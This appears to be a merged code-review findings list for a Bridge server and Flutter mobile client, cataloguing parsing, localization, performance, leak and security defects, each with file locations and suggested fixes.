- `A3` **[bug]** `packages/bridge/src/websocket.ts:6065` — Restart session_created carries legacy permissionMode; Mobile re-derives on-request
  Sandbox/permission restarts broadcast buildSessionCreatedMessage with permissionMode/executionMode invented from unknown approvalPolicy (unknown→'default'), while correctly omitting approvalPolicy. Mobile's hasExecutionSignals (chat_message_handler.dart:906-930) treats permissionMode as an execution signal and codexApprovalPolicyFromLegacyExecutionMode('default') hard-sets onRequest (messages.dart:437-441), undoing Bridge's unknown-preservation. Mobile must only update codexApprovalPolicy when msg.approvalPolicy != null and Bridge should not invent executionMode.
- `D1` **[bug]** `packages/bridge/src/websocket.ts:6382` — approve/reject/answer accept missing sessionId/id and fall back to arbitrary session/approval
  resolveSession(undefined) returns getFirstSession() (websocket.ts:9595-9606) and resolvePendingApproval(undefined) grabs an arbitrary pending (codex-process.ts:2408-2413), so any connected client can approve any session, and omitting both ids approves 'some approval of some session'. Make sessionId and id mandatory (400 otherwise) and remove the fallbacks; the deeper device-identity binding intersects the skipped batch-0 auth tightening but the strict-argument fix is pure correctness.
- `3/D-3` **[bug]** `packages/bridge/src/websocket.ts:8170` — path_not_allowed returns type:'error' only; git screen loading/staging stuck forever
  buildPathNotAllowedError responds with {type:'error'} instead of diff_result/git_stage_result at ~10 git handler sites; the cubit sets loading:true and waits only on diffResults with no timeout or error channel, so it spins forever and git_screen.dart:327 even hides the refresh button while loading. Failed stages likewise leave staging=true, disabling all buttons via _isBusy.
- `SEC-3` **[bug]** `packages/bridge/src/websocket.ts:8870` — list_windows/take_screenshot 无任何授权，构成完整屏幕监控能力
  websocket.ts:8870-8951 与 screenshot.ts:88,141 无 isPathAllowed、无 authorizer、无 capability 检查。可枚举全部窗口标题（泄露正在浏览的网页/聊天软件/密码管理器）并全屏截图，截图自动入 gallery 并 broadcast 给所有连接的客户端，且不受 BRIDGE_ALLOWED_DIRS 约束。
- `B-1` **[bug]** `packages/bridge/src/websocket.ts:10028` — notifications_only mode double-delivers: WS local plus FCM system notification
  trackSessionMessage's maybeSendPushNotification and the notifications_only projection are two mutually unaware pipelines, so an Always-Location client in notifications_only mode gets both a local notification (via background_notification_v1) and an FCM push for the same event. Their notification IDs differ (Object.hash vs a custom base-31 hash in main.dart:862), so they cannot collapse and the user sees duplicates.
- `SEC-5` **[bug]** `packages/bridge/src/worktree.ts:249` — .gtrconfig hook.postCreate 用带 shell 的 execSync 执行仓库自带命令
  `for (const cmd of config.hook.postCreate) execSync(cmd, {cwd: wtPath, ...})` 无交互确认无授权提示。用户 clone 任意第三方仓库（本产品核心使用场景）后在手机上点"创建 worktree"，仓库自带配置即以用户权限执行任意命令，典型供应链攻击面。

### Mobile

- `B3` **[compat]** `apps/mobile/lib/features/artifact_preview/artifact_preview_screen.dart:67` — Platform gate only on agent entry; macOS file-browser preview red-screens
  supportsEmbeddedArtifactPreview gates chat_message_list but not file_browser_screen. On macOS there is no desktop WebView implementation in pubspec.lock, so _initializeWebPreview asserts on WebViewPlatform.instance; the throw inside the on-Unsupported handler escapes the try, and the HTML path throws in initState causing a red screen. Android gets browser vs in-app WebView depending on entry.
- `A5` **[bug]** `apps/mobile/lib/features/artifact_preview/artifact_preview_screen.dart:77` — expiresAt is a dead field; after 10-min token TTL all actions fail
  expiresAt is declared but never referenced; PREVIEW_TTL_SECONDS=600 on the Bridge. After 10 minutes on the preview screen, share/download/retry hit 404 http_error with no re-issue path or countdown, forcing the user to exit and reopen.
- `A8/P0-19-A8` **[bug]** `apps/mobile/lib/features/artifact_preview/artifact_preview_screen.dart:185` — iOS onHttpError is dead code; HTTP 4xx/410 error JSON rendered as content
  The handler checks error.request?.uri.path but webview_flutter_wkwebview never populates request on iOS, so the condition is always false. Token expiry 404, 409 file_changed, and 410 file_gone render the raw error JSON body as the page with no failure state or retry; Android passes request so this is iOS-only.
- `B2` **[logic]** `apps/mobile/lib/features/artifact_preview/artifact_preview_screen.dart:379` — Two download implementations write to same directory with different naming/index
  File-browser entry uses the Bridge file-transfer pipeline (transferId, resume, inbox record, checkpoint) while the agent entry's _downloadArtifact does direct HTTP streaming with none of that. Both write Documents/Downloads with different rename policies, and FileTransferStorage cleanup does not know about the direct-download files.
- `D-1` **[bug]** `apps/mobile/lib/features/background_sync/background_sync_coordinator.dart:220` — BGAppRefresh cold start: lifecycle unknown so markDartReady never fires; stalls
  When BGTask cold-launches the app, lifecycleState is detached/null so _lifecycleModeFor returns unknown and both start()'s gate and _publishDartReadyForLifecycle skip markDartReady(); the native refreshController stays waitingForEndpoint and fails after 25s without rescheduling (native deliberately does not, and Dart's scheduleRefresh only runs inside the never-executed _performAppRefresh). BGAppRefresh is then permanently stalled until the user manually foreground-cycles the app.
- `H-15` **[perf]** `apps/mobile/lib/features/chat_session/state/chat_session_cubit.dart:439` — starting 状态每 3 秒无限请求 history，无 deadline 无退避
  Timer.periodic(3s) 只在状态离开 starting 或 close()（:5325）时取消，唯一缓和是 mirror bootstrap 成功时跳过 1 个 tick。会话永远不 resolve 时每 3 秒发一次 get_history 直到页面关闭，持续压 Bridge 的全量历史读取路径。
- `3.3` **[logic]** `apps/mobile/lib/features/chat_session/state/chat_session_cubit.dart:2295` — 无 UUID 时以 'text:${e.text}' 为 key，同文本用户消息互相污染
  existingUserData['text:${e.text}'] = e（:2301）同文本后写覆盖先写，:2313 按同 key 回查。两轮内容相同的用户消息共享同一 entry，:2324-2339 的合并逻辑用错对象，图片 bytes 与本地时间戳互相污染。
- `D-4` **[perf]** `apps/mobile/lib/features/chat_session/state/chat_session_cubit.dart:3547` — Synchronous base64Encode of up to 5 large images (~20MB) on message send
  images.map base64Encode runs synchronously on the main isolate for up to five 2048px images, building roughly 20MB of Strings and dropping frames at the moment the user sends a message. Should move to compute().
- `1/E-4` **[bug]** `apps/mobile/lib/features/explore/state/explore_cubit.dart:22` — Explorer infinite loading: no timeout, no failure path, ExploreStatus.error dead code
  Initial state defaults to loading and requestFileList is fire-and-forget with no requestId or Timer; _applyFiles only ever emits ready/empty with error:null. Nothing in lib/ assigns ExploreStatus.error, so on bridge-down, scan failure, or permission denial the user sees a spinner forever and the error UI branch is unreachable.
- `2/E-5` **[bug]** `apps/mobile/lib/features/explore/state/explore_cubit.dart:23` — FileListMessage has no correlation; any broadcast (incl. empty reset) overwrites the tree
  FileListMessage carries no projectPath/requestId and bridge_service broadcasts to all subscribers, including an intentional empty list on session reset (line 2045) that flips Explorer to 'No files to explore' permanently. Aggravated by codex_session_screen.dart:1102-1111's app-resume callback lacking the isBackground guard (claude_session_screen.dart:897 same), so every resident session re-requests with its own chatFileRoot which differs from Explorer's projectPath under worktrees.
- `B4` **[compat]** `apps/mobile/lib/features/file_browser/file_browser_screen.dart:9` — Direct import of dart:io preview screen breaks flutter build web
  file_browser_screen.dart imports artifact_preview_screen.dart (which imports dart:io) directly instead of the conditional artifact_preview_entry.dart that exists for this purpose. The screen is referenced from session_list_screen and workspace_shell_screen, and CLAUDE.md lists flutter build web --release as a standard workflow, so web builds fail to compile.
- `A3` **[bug]** `apps/mobile/lib/features/file_peek/file_peek_sheet.dart:478` — >8MiB JSON in File Peek is a dead end with no fallback actions
  Bridge returns errorCode file_too_large and the mobile _buildError() renders only an icon and message. There is no download, share, or open-in-unified-preview button, so large files are completely inaccessible from this entry.
- `A2/D11` **[perf]** `apps/mobile/lib/features/file_peek/file_peek_sheet.dart:560` — Minified single-line JSON in File Peek freezes main isolate
  Bridge truncates by lines (FILE_PEEK_TEXT_MAX_BYTES=8MiB), so a single-line minified JSON returns up to 8MiB at once. _buildCodeContent runs split('\n') + syntax highlighting + span splitting synchronously inside build() with no memoization, re-running on every setState.
- `C-4/C15` **[leak]** `apps/mobile/lib/features/file_transfer/file_transfer_service.dart:1024` — Unrecoverable failure keeps checkpoint; every reconnect retries the bad task
  The non-recoverable failure branch (download_identity_mismatch, commit_tombstone_mismatch, invalid_transfer_url) records failure but never calls _cleanupWork, so checkpoint JSON plus .part stay on disk for 7 days and _recover re-runs and re-fails the same task on every reconnect, flooding recentResults.
- `C-5` **[bug]** `apps/mobile/lib/features/file_transfer/file_transfer_service.dart:1741` — Uploads have zero chunk-level retry; download backoff maxes at about 450ms
  _runUpload calls _http.uploadChunk bare, so one transient socket blip pauses the entire transfer through the expensive re-prepare/headUpload/offset renegotiation path. Downloads retry 3 times but _retryDelay is 150ms*(attempt+1)+jitter (under 1.2s total), nearly useless on weak networks, unlike the correct exponential backoff in _scheduleCompletionRecoveryRetry.
- `C16` **[bug]** `apps/mobile/lib/features/file_transfer/file_transfer_service.dart:1956` — Upload chunks have no retry; download retry backoff totals under 1.2 seconds
  _http.uploadChunk is a bare call with zero retries, while _downloadChunkWithRetry retries 3 times with max ~450ms backoff (<1.2s total), guaranteeing failure on weak networks. _scheduleCompletionRecoveryRetry shows the correct exponential-backoff pattern the chunk paths lack.
- `C-3/C14` **[leak]** `apps/mobile/lib/features/file_transfer/file_transfer_service.dart:2282` — _uploadCompletions never resolved when _recover discards checkpoints
  _recover deletes expired or identity-mismatched upload checkpoints with continue, without completing or removing _uploadCompletions[localId]; the map grows monotonically and awaitDroppedUpload / _showHomeTransferResult hang forever, leaving chat attachments stuck in 'uploading'.
- `D-3/D3` **[bug]** `apps/mobile/lib/features/file_transfer/file_transfer_sheet.dart:176` — authorizeMutation closures use BuildContext across long awaits, no mounted check
  The closure passed to uploadToMac runs only after picker interaction and staging (potentially tens of seconds); the sheet may be dismissed by then, so context.read<FileBrowserService>() and _FileMutationAuthCopy.of(context) throw on a defunct Element. Same pattern at file_transfer_sheet.dart:470, chat_input_with_overlays.dart:669, and session_list_screen.dart:860; none check context.mounted.
- **[l10n]** `apps/mobile/lib/features/file_transfer/file_transfer_sheet.dart:519` — _TransferCopy: 31 file-transfer strings on a zh/en boolean; ja/ko fall back to English
  final bool zh drives every getter, so Japanese/Korean users get English for the whole File Transfer sheet. Convert to the existing 4-language pattern (side_chat_strings.dart) or ARB.
- `C-6/C17` **[leak]** `apps/mobile/lib/features/file_transfer/file_transfer_storage.dart:920` — Per-identity scope dirs never GC'd after bridge identity change
  Storage is partitioned as v2/<sha256(logicalIdentity)>/{receive,upload} but _recover only scans the currently connected identity. After a Mac swap or Bridge reinstall, old scopes containing up to 15GiB .part/.stage files and checkpoints are never revisited by any code path; the 7-day expiry logic cannot reach them and no v2/* enumeration exists anywhere.
- `3/D-5/D5` **[perf]** `apps/mobile/lib/features/gallery/widgets/gallery_tile.dart:45` — Zero cacheWidth/cacheHeight/maxBytes in lib/; ImageCache limits never tuned
  Grep confirms no cacheWidth/cacheHeight/maximumSizeBytes anywhere: 2-column grid tiles decode 1290x2796 screenshots at full size (~14.4MB each), and the same applies to gallery_image_viewer, message_images_screen, generated_image_chat_group (80px tiles decoding originals), preview pages, image_preview thumbnails, and user_bubble. allowImplicitScrolling in generated_image_preview_screen keeps at least 3 full bitmaps resident, driving OOM on low-end devices.
- `2/D-4/D4` **[perf]** `apps/mobile/lib/features/generated_image_preview/generated_image_preview_mapper.dart:115` — Large base64 work on main isolate in build paths; sync draft save; per-rebuild re-decode
  Base64 decode runs synchronously on the main isolate; assistant_bubble.dart does Image.memory(uri.data!.contentAsBytes()) inside build; draft_service.saveImageDraft is a synchronous void method doing base64Encode+jsonEncode within the frame; file_peek_sheet._imageBytes() is called from build so a 5MB image is re-decoded every rebuild with no cache.
- **[l10n]** `apps/mobile/lib/features/git/git_screen.dart:272` — 25 hardcoded English strings across the Git screen; partial ARB migration stalled
  'View File', 'Stage'/'Unstage'/'Revert'/'Request Change', 'Cancel', 'Revert All', 'Stage All', 'Commit' etc. are hardcoded while lines 511/593 already use ARB keys, showing a half-finished migration. Whether Stage/Unstage/Commit remain as Git terms needs an explicit product decision rather than the current unplanned gap.
- `5/D-5` **[perf]** `apps/mobile/lib/features/git/state/git_view_cubit.dart:86` — Full diff parsed synchronously on UI thread with no isolate, truncation, or paging
  parseDiff(initialDiff)/parseDiff(result.diff) run directly in the cubit with no compute/Isolate.run anywhere in the repo, while the server can send up to 10MB of diff (maxBuffer). A 10MB diff blocks the main thread for seconds building millions of strings; beyond 10MB the request fails with ENOBUFS and no truncated-diff degradation path exists.
- `4/D-4` **[bug]** `apps/mobile/lib/features/git/widgets/branch_selector_sheet.dart:191` — Branch checkout failure completely swallowed, no user feedback
  onTap calls cubit.checkout(branch) then immediately pops the sheet, closing the BranchCubit so its error emit lands on a destroyed cubit, and GitViewCubit._onCheckoutResult only handles success. When checkout fails (e.g. dirty working tree) the branch stays unchanged with zero error shown, so the user believes the switch succeeded.
- `D-6` **[perf]** `apps/mobile/lib/features/git/widgets/diff_hunk_widget.dart:111` — TextPainter.layout per line, zero intra-hunk virtualization, full recompute per refresh
  _calcMaxContentWidth lays out every line in initState and _DiffHunkBody builds a Column of all lines, with one ListView item spanning a whole file's hunks; since DiffHunk lacks operator== (diff_parser.dart:95-118), every stage/unstage refresh re-runs full TextPainter measurement for all visible hunks.
- `6` **[perf]** `apps/mobile/lib/features/git/widgets/diff_hunk_widget.dart:118` — TextPainter.layout per line and no hunk virtualization; full recompute on refresh
  _calcMaxContentWidth lays out a TextPainter for every line in initState, and _DiffHunkBody builds all lines of a hunk as one Column with a whole file (all hunks) as a single ListView item. Because DiffHunk has no == override, every parseDiff after stage/unstage produces new objects and retriggers full TextPainter recomputation for all visible hunks.
- `7/D-7` **[leak]** `apps/mobile/lib/features/git/widgets/diff_image_widget.dart:384` — Diff images decoded at full resolution into an unbounded cache; OOM risk
  Image.memory has no cacheWidth/cacheHeight even though the container is capped at 200px, so a 5MB 8000x8000 PNG decodes to ~256MB ARGB for old and new each. _diffImageCache in bridge_service.dart has no byte cap or LRU and only clears on session stop/disconnect, so browsing a diff with dozens of images accumulates raw bytes indefinitely.
- `A2` **[l10n]** `apps/mobile/lib/features/mobile_update/l10n/mobile_update_strings.dart:6` — 17 ad-hoc localization tables live outside the ARB toolchain
  12 top-level *Strings classes plus 5 private _*Copy classes bypass ARB entirely, so they get no key-consistency validation, no avoid_hardcoded_japanese lint coverage, and no translation-progress visibility. At minimum they need a per-feature convention with all 4 languages and a CI field-count consistency check.
- `B1` **[logic]** `apps/mobile/lib/features/mobile_update/mobile_update_models.dart:5` — Shorebird track names inconsistent across code, CI, and docs; CI patches never delivered
  The app enum only queries stable/owner tracks, but ios-patch.yml and android-patch.yml default to 'staging' with options [staging, stable] (no owner), so a patch published via CI lands on a track no build ever queries and is silently lost. CLAUDE.md documents staging and a wrong unlock entry point (the real track switch is 7 taps on the settings version row, not 5 taps on the debug logo); unify on owner and assert track validity in patch.sh/workflows.
- `B2` **[logic]** `apps/mobile/lib/features/mobile_update/mobile_update_service.dart` — OTA chain has no rollback path and no kill-switch
  A downloaded patch takes effect on restart; if it crashes at startup on some device the user has no in-app way back to the base version and there is no remote disable, forcing delete-and-reinstall (losing the local session DB). shorebird.yaml sets auto_update: false so everything depends on the in-app implementation, which has no crash detection or first-launch canary.
- `3/E-10` **[bug]** `apps/mobile/lib/features/session_archive/session_archive_cubit.dart:83` — Connection jitter reported as archive/delete FAILURE, contradicting feature's own policy
  Any non-connected status (including the connecting/reconnecting phases of every reconnect) triggers _failAll → error: → UI shows strings.failed, while session_archive_pending_requests.dart:30-33 documents the opposite policy (report result-unknown, archiveResultUnknown string exists but is unused here). A successful Bridge-side delete during jitter shows 'operation failed' and the list is not refreshed, so the deleted session still appears.
- `R-2` **[bug]** `apps/mobile/lib/features/session_link/session_link_screen.dart:99` — 深链 _sessionRoute 传了 8 个参数但缺 durableProviderSessionId（H-1 第三条入口）
  构造 CodexSessionRoute/ClaudeSessionRoute 时传了 sessionId、projectPath、gitBranch、worktreePath 等 8 个参数，唯独没有 durableProviderSessionId。第 1 轮只点名了 session_list_screen.dart，这是第三条未接线入口。
- `4/E-1` **[bug]** `apps/mobile/lib/features/session_link/state/session_link_cubit.dart:36` — resolve() has no try/catch; any throw leaves screen permanently at Resolving
  resolve() awaits _bridge.resolveSessionLink fire-and-forget with no error handling; resolveSessionLink's firstWhere on connectionStatus has no orElse and throws StateError when the controller closes (bridge dispose), passing through the on-TimeoutException-only catch, and its finally block's jsonDecode can also throw. The state then stays resolving() forever and the escape button only appears in the unavailable state.
- `5/E-2/R-1` **[bug]** `apps/mobile/lib/features/session_link/state/session_link_cubit.dart:83` — Resume phase has no timeout or disconnect handling: permanent 'Resuming...'
  resolve() has a 10s timeout but _resume only converges when _handleResumeMessage receives session_created or session_resume_failed. If the Bridge crashes, disconnects, or silently drops the request there is no Timer or connectionStatus subscription, so the state machine stays in resuming with no escape UI.
- `E1/S-9` **[bug]** `apps/mobile/lib/features/session_list/session_list_screen.dart:484` — Deep link ccpocket://connect connects with no confirmation and persists attacker machine
  _onDeepLink calls _connectWithParams(serverUrl, token) directly; on a successful health check it connects and recordConnection persists the host/port/token into the Machines list. A crafted link pointing at an attacker server silently redirects all future prompts there and enables fake approval-request phishing; the QR scan path behaves identically. A pre-connect confirmation dialog showing host:port is needed.
- `H-1` **[bug]** `apps/mobile/lib/features/session_list/session_list_screen.dart:1742` — durableProviderSessionId 手机端三条入口全缺，缓存秒开与优先级提升是死代码
  `grep durableProviderSessionId lib/router/app_router.gr.dart` 零命中，生成的路由类里根本没有该字段，screen 构造参数恒为 null。后果链：_startDurablePreview 直接 return（claude_session_screen.dart:208-209）→ 无缓存秒开、无 setFocusedConversation 优先级提升、既有会话仍显示"正在创建会话"。只有 embedded workspace 路径（workspace_shell_screen.dart:1187,1205）生效。
- `B-3` **[logic]** `apps/mobile/lib/features/session_list/state/session_list_cubit.dart:706` — RecentSession sorted by lexicographic compare of raw ISO strings
  modified/created are raw wire strings compared via String.compareTo; mixed Z/+offset formats representing the same instant missort and '' sorts to an extreme. Same pattern in unseen_sessions_cubit 211/217/232 and prompt_history_section 379.
- `A-1` **[compat]** `apps/mobile/lib/features/side_chat/side_chat_protocol_slot.dart:508` — 严格键白名单族：4 套实现覆盖 6 feature / 19 消息类型，Bridge 加字段即整条被拒
  _sideChatRequireOnlyKeys（11 处调用）、file_transfer_protocol_slot.dart:583-592、file_browser_protocol_slot.dart:1202-1260（result/root/node/statItem 四层）、auto_approval_protocol_slot.dart:96-110 全部拒绝未知字段，与项目"additive + capability negotiation"的协议原则直接冲突。且当前行为被 file_browser_protocol_test.dart:565-571 的断言固定住，改为宽松会弄红现有测试（属刻意语义变更，需用户决策）。
- **[l10n]** `apps/mobile/lib/features/side_chat/widgets/auxiliary_floating_dock.dart:493` — 161 zh/en binary strings across 13 files; ja/ko degraded to English
  Files include tool_categories.dart (58), file_transfer_sheet.dart (31), rewind_message_list_sheet.dart (14), chat_process_disclosure.dart (10), session_list_screen.dart (10), auxiliary_floating_dock.dart (10), chat_input_with_overlays.dart (7), codex_session_screen.dart (7), assistant_bubble.dart (5), chat_message_list.dart (3), claude_session_screen.dart (3), tool_result_bubble.dart (2), received_file_inbox_banner.dart (1), all using the languageCode == 'zh' ? zh : en pattern. These are scars of the zh-rush; converge them and add a lint/CI grep gate banning new "== 'zh' ?" branches.
- `A-3` **[bug]** `apps/mobile/lib/features/side_chat/widgets/ephemeral_side_chat_pane.dart:92` — Reopening side chat from menu always forks a new child instead of reusing survivor
  _resolveOrOpen() only reuses when widget.childSessionId != null, and the only caller passing it is the floating-dock re-entry (codex_session_screen.dart:1922); side_chat_ui_slot.dart menu/selection entries pass nothing and paneDescriptor sets rememberPerSession:false. Open→close→reopen creates child#2 while #1 lives; four repeats hit the per-parent limit with the user unaware of the orphans. Should query entriesForParent and reuse the latest live child first.
- `B-2` **[bug]** `apps/mobile/lib/features/subagents/state/subagents_controller.dart:62` — Subagent state is a one-shot snapshot: no push, no polling, no running→done convergence
  subagents.ts is pure request-response (no broadcast/watcher) and SubagentsController only refreshes on construction, session change, and reconnect — no Timer. An open panel never reflects completion/failure/cancellation; the dock's running badge freezes. Poll every 5-10s while Active is non-empty (paused in background) or push increments from Bridge on thread state changes.
- `A1` **[l10n]** `apps/mobile/lib/l10n/app_zh.arb` — 77 zh-only ARB keys silently dropped; 76 finished Chinese translations never shown
  app_zh.arb has 77 keys absent from the template app_ja.arb, and gen-l10n only generates getters for template keys, so translations like addAndConnect/addMachine/status* never reach the UI. The keys overlap heavily with the machine-edit strings flagged as untranslated, meaning completed localization work was silently lost; add the keys to ja/en/ko and add a CI ARB key-set consistency check.
- `L-1` **[l10n]** `apps/mobile/lib/l10n/app_zh.arb` — app_zh.arb 有 77 个多出键，其中 76 个永远不会生成 getter
  l10n.yaml 的 template-arb-file 是 app_ja.arb（872 键），app_zh.arb 有 949 键。模板中不存在的键不会生成 getter，这 76 条翻译写了也用不上；反过来说明中文有译文而模板语言缺键的文案在其它语言下会回落。
- `A04` **[compat]** `apps/mobile/lib/models/local_features/slots/auto_approval_protocol_slot.dart:96` — auto_approval unknown-field hard reject hangs the toggle to TTL
  Adding updatedAt/scope to auto_approval_state_v1 throws on the inline allowedKeys set; the message drops, _clearPendingLocalFeatureRequestForTerminal never fires, and the auto-approval toggle spins until TTL timeout. Fix: ignore unknown keys.
- `A09` **[compat]** `apps/mobile/lib/models/local_features/slots/codex_desktop_continuity_protocol_slot.dart:305` — Continuity unknown enum fallback nullified by validator that throws on unknown
  The enum has an unknown member (:90-100) but _validate throws 'case unknown: throw FormatException', so the fallback never helps; a new continuity event kind drops the whole frame including mirrored conversation payload. Unknown events should be silently ignored.
- `A06` **[compat]** `apps/mobile/lib/models/local_features/slots/conversation_content_protocol_slot.dart:43` — ConversationContentEventKind.parse throws with no unknown fallback
  New Bridge events (snapshot_cancelled, resumed) throw FormatException, dropping the message with a fake Parse error and stalling the subscription stream; mirror slot (:109/:118 + :497) has unknown fallback with skip — opposite strategies on the same protocol shape. Fix: unknown member + upper-layer ignore.
- `C02` **[logic]** `apps/mobile/lib/models/local_features/slots/conversation_content_protocol_slot.dart:60` — ConversationContentTarget.key omits bridgeInstanceId present on the message
  key = provider+providerSessionId although bridgeInstanceId is a required field on the same message; two Bridges' revisions overwrite each other in multi-Bridge use.
- **[bug]** `apps/mobile/lib/models/local_features/slots/conversation_content_protocol_slot.dart:498` — is! int rejects JSON doubles (3.0) dropping events; web/native behavior split
  pageCount: 3.0 / entryCount: 12.0 (any backend serializing integers as doubles) throw FormatException; sister mirror slot (:568) correctly accepts num with integrality check. Same defect at auto_approval:119-139 (plus >4096 hard cap rejects legal values), file_browser:1382-1391 and file_transfer:615-627, where dart2js treats 1.0 is int as true, so simulator passes but native devices fail.
- **[bug]** `apps/mobile/lib/models/local_features/slots/ephemeral_side_chat_protocol_slot.dart:244` — Registry list parsing lacks per-item tolerance; one bad entry empties the list
  rawEntries.map(EphemeralSideChatEntry.fromJson) has no try/catch, so one malformed createdAt or extra field makes the user see an empty/errored side-chat list instead of one missing item; same class of issue at subagents_protocol_slot:191-199 (per-message ServerMessage.fromJson without isolation). Fix: per-item skip + skippedCount.
- `P1-5` **[logic]** `apps/mobile/lib/models/local_features/slots/file_browser_protocol_slot.dart:140` — Decode failures cannot fail pending requests; UI spins until TTL timeout
  Decode exceptions become generic ErrorMessage('Parse error: ...') whose text lacks the requestType, so the substring/regex matchers (file_browser:140-154, side_chat:80-82, continuity:71-81, mirror:86-95) never match and pending requests hang to TTL. Fix: correlate via errorCode + structured requestId, extracting requestId from raw json on local decode failure.
- `A07/P1-1` **[compat]** `apps/mobile/lib/models/local_features/slots/file_browser_protocol_slot.dart:166` — Unknown FileBrowserNodeKind throws, killing entire directory listing
  FileBrowserNodeKind.parse throws FormatException for any kind outside the four known values (e.g. future fifo/socket), and the exception bubbles up through FileBrowserNode.fromJson to FileBrowserListResultMessage.fromJson, losing the whole page of entries instead of one item. The enum already defines other('other') but it is not used as fallback.
- `P1-4` **[compat]** `apps/mobile/lib/models/local_features/slots/file_browser_protocol_slot.dart:424` — Nullable-declared capability fields are required in fromJson; no degradation
  Fields like downloadAvailable are declared nullable with null defaults, yet fromJson uses _fileBrowserRequiredBool, so an older/reduced Bridge omitting the capability field fails the whole roots message and even read-only browsing breaks. The call site (file_browser_service.dart:367-372) then uses ! assertions, gluing the contradictory contracts together with exceptions.
- `P1-3` **[compat]** `apps/mobile/lib/models/local_features/slots/file_browser_protocol_slot.dart:481` — Server capability values above client constants reject whole roots result
  downloadMaxBytes is hard-validated against local maxFileBrowserDownloadBytes; if the Bridge raises FILE_BROWSER_DOWNLOAD_MAX_BYTES (e.g. 15GB to 32GB), the entire roots result is rejected and the file browser becomes unusable. Same pattern at line 467 (more than 33 roots fails everything) and 800-804 (preview sizeBytes). Should clamp min(server, local) instead of throwing.
- `A03/P1-2` **[compat]** `apps/mobile/lib/models/local_features/slots/file_browser_protocol_slot.dart:1251` — file_browser four-layer strict whitelist — one new node field kills browser
  Result envelope, root, node and stat-item each whitelist keys; a new per-node field (isHidden/ownerUid) appears on every node so the entire directory listing frame is discarded on every page — file browser completely unusable against a newer Bridge. Also success responses forbid 'error' and failures forbid payload keys.
- `A02` **[compat]** `apps/mobile/lib/models/local_features/slots/file_transfer_protocol_slot.dart:583` — _fileTransferRequireExactKeys throws on unknown fields (all 6 messages)
  Every file_transfer_*_v2/v3 message rejects unknown keys; the v2/v3 type-forking shows fields do grow, but the chosen mechanism turns an additive protocol into a breaking one.
- **[logic]** `apps/mobile/lib/models/local_features/slots/session_insights_protocol_slot.dart:209` — utilization unit semantics undefined; string value throws TypeError
  UI consumes utilization as percent (clamp(0,100), used/100) but the model does no normalization: if Bridge switches to a 0..1 fraction the UI silently shows 0%/1%, and a string "45.2" throws TypeError dropping the whole quota response. Fix: define unit (store 0..1 fraction), clamp, and accept num/String.
- **[bug]** `apps/mobile/lib/models/local_features/slots/session_insights_protocol_slot.dart:355` — Bare as List? casts drop whole session_usage_result on object-shaped payload
  (json['credits'] as List?), limitCards:398, providers:460 throw TypeError if Bridge sends a single object/map instead of an array; the entire usage result is discarded. Same pattern at subagents_protocol_slot.dart:132,192. Fix: v is List ? v : (v is Map ? [v] : const []).
- `A05` **[compat]** `apps/mobile/lib/models/local_features/slots/side_chat_protocol_slot.dart:98` — SideChatEventKind.parse throws on unknown events with no fallback
  New Bridge events (thinking, tool_call, token_usage) drop the whole message; CodexDesktopContinuityEventKind.parse in the sibling slot has an unknown fallback, so the two are inconsistent. Fix: unknown member returning an ignorable instance.
- **[bug]** `apps/mobile/lib/models/messages.dart:32` — Assistant content parsing bare-casts type/text/input/content
  json['type'] as String, json['text'] as String, json['input'] as Map (often null for no-arg tools), and (json['content'] as List) (null on interrupted turns) throw and drop the whole assistant message. Fix with null-tolerant defaults reusing the existing _ fallback branch.
- `C01` **[logic]** `apps/mobile/lib/models/messages.dart:230` — Global identity key missing bridge dimension; three key schemes (dup)
  providerSessionIdentityKey = provider+sessionId while pin keys add projectPath and cache partitions by bridge sha256; two Bridges or iCloud/rsync-synced project dirs merge sessions and one silently vanishes; archiving one archives both. bridgeInstanceId is parsed (1235) but not propagated.
- `F04` **[logic]** `apps/mobile/lib/models/messages.dart:482` — Codex defaultMode legacy-mapped to acceptEdits; provider binarized (dup)
  Permission-loosening translation toward old Bridges; any third provider treated as Claude at 4390/4668.
- `B-1/B01` **[bug]** `apps/mobile/lib/models/messages.dart:929` — Offset-less ISO timestamps parsed as phone-local time; feed sort/dedup
  DateTime.tryParse of a string without Z/offset yields isUtc=false local time; Bridge in another timezone skews every timestamp (up to 12h when travelling). These values are used for message ordering and dedup, not just display.
- `A-3/A20` **[bug]** `apps/mobile/lib/models/messages.dart:1115` — error frame `message` bare as String defeats graceful degradation
  A structured error carrying only errorCode throws TypeError and is replaced by 'Parse error: ...'; the real errorCode is lost so chat_message_handler's unsupported_message branch never matches and the degradation mechanism fails wholesale.
- `A-6` **[bug]** `apps/mobile/lib/models/messages.dart:1139` — history/history_page/history_delta/history_snapshot lack per-entry tolerance
  All four batch messages use (json['messages'] as List).map(HistoryEntry.fromJson) with no per-item try/catch; one entry missing a required field (e.g. tool_result without toolUseId) drops the whole session history and shows a Parse error. Correct pattern already exists at history_tool_details (:1163-1172) and conversation_mirror_service. Fix: per-entry skip + skippedCount.
- `A-4` **[bug]** `apps/mobile/lib/models/messages.dart:1229` — stream_delta/thinking_delta text bare cast can spam Parse error bubbles
  A metadata-only delta frame (no text) throws TypeError; in streaming every frame can hit, flooding the chat with red Parse error bubbles.
- `A19` **[bug]** `apps/mobile/lib/models/messages.dart:1285` — Aggregate one-bad-element-kills-batch amplification (11 paths)
  recent_sessions, past_history/AssistantContent, ImageRef, WindowInfo, DiffImageChange (kills text diff too), WorktreeInfo, UsageInfo, HistoryToolDetail (R4 completer hang), PromptHistory sync (permanent stall), subagents slot 192-199, conversation_mirror entry list 502-516 — each discards its whole batch on one bad element.
- `B-2` **[bug]** `apps/mobile/lib/models/messages.dart:2095` — Raw string timestamps later tryParse'd as local; expiresAt shifts URL expiry
  expiresAt/UserInput.timestamp/archivedAt/occurredAt/activityAt are stored raw; consumers tryParse without Z get local time and .toLocal() is a no-op. expiresAt shifting by the tz offset makes signed URLs judged expired early (previews all fail) or used after expiry. Three coexisting toUtc/toLocal conventions in the codebase.
- `F02` **[logic]** `apps/mobile/lib/models/messages.dart:2296` — Unknown GuardianApprovalRisk drops the whole notice (dup)
  unknown treated as parse failure returns null; new severe/blocker levels — precisely the riskiest — are swallowed entirely.
- `A11/A12/F-4` **[compat]** `apps/mobile/lib/models/messages.dart:2568` — availableDecisions whitelist can yield a zero-button approval card
  If Bridge sends only renamed/unknown decisions (approveOnce/defer), canApprove and canDecline are both false: no buttons at all, session permanently stuck in waiting_approval. canDecline needs an unconditional escape hatch and unknown decisions should render as passthrough buttons.
